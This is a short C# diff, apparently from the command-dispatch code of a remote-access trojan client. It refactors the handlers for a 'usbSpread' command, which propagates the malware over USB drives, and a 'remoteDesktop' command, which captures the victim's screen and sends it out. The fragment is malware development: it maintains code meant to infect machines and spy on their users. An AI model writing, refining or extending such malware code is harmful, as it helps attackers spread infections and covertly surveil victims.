@@ -101,13 +101,13 @@ namespace Client.Handle_Packet
 
                     case "usbSpread":
                         {
-                            new HandleLimeUSB().Run(); ;
+                            new HandleLimeUSB().Run();
                             break;
                         }
 
                     case "remoteDesktop":
                         {
-                            new HandleRemoteDesktop().CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
+                            new HandleRemoteDesktop(unpack_msgpack);
                             break;
                         }
 
